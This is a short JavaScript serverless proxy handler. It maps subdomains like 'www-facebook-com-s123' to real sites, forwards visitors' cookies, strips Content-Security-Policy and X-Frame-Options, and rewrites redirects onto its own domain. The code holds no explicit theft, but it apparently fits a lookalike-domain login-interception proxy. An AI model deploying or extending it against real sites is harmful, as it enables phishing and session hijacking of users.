// api/proxy.js

const HOP_BY_HOP_HEADERS = [
  'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
  'te', 'trailers', 'transfer-encoding', 'upgrade',
  'content-security-policy', 'x-frame-options',
];

export default async function handler(req, res) {
  try {
    // NEW LOGIC: Determine the target URL from the subdomain
    const host = req.headers['host']; // e.g., 'www-facebook-com-s123.dozemulti.com'
    const parts = host.split('.');
    
    // This expects a format like "www-facebook-com-s123.yourdomain.com"
    const subdomain = parts[0]; 
    const subdomainParts = subdomain.split('-');
    
    // The last part is the unique ID, the rest is the URL
    const uniqueId = subdomainParts.pop();
    const targetHost = subdomainParts.join('.').replace(/-/g, '.'); // Reconstructs 'www.facebook.com'

    if (!targetHost) {
      return res.status(400).send("Could not determine target host from subdomain.");
    }

    const targetUrl = `https://${targetHost}${req.url}`; // Append the path, like /login.php

    const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";

    const response = await fetch(targetUrl, {
      headers: { 'User-Agent': userAgent, 'Cookie': req.headers['cookie'] || '' },
      redirect: 'manual' // We need to handle redirects to rewrite the domain
    });
    
    // Handle redirects manually
    if (response.status >= 300 && response.status < 400 && response.headers.has('location')) {
        const location = response.headers.get('location');
        // If redirect is absolute, rewrite it to our subdomain structure
        const redirectUrl = new URL(location, targetUrl);
        const newSubdomain = redirectUrl.hostname.replace(/\./g, '-') + '-' + uniqueId;
        const finalRedirectUrl = `https://${newSubdomain}.yourdomain.com${redirectUrl.pathname}${redirectUrl.search}`;
        
        res.setHeader('Location', finalRedirectUrl);
        res.status(response.status).end();
        return;
    }

    // Copy and filter headers
    response.headers.forEach((value, key) => {
      if (!HOP_BY_HOP_HEADERS.includes(key.toLowerCase())) {
        res.setHeader(key, value);
      }
    });

    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html')) {
      let body = await response.text();
      // The base tag is CRITICAL for all assets (CSS, JS) to load correctly
      const baseTag = `<base href="https://${targetHost}/">`;
      body = body.replace(/<head[^>]*>/i, `$&${baseTag}`);
      res.status(response.status).send(body);
    } else {
      const body = await response.arrayBuffer();
      res.status(response.status).send(Buffer.from(body));
    }

  } catch (error) {
    console.error("--- PROXY FAILED ---", error);
    res.status(500).send("Proxy request failed: " + error.message);
  }
}
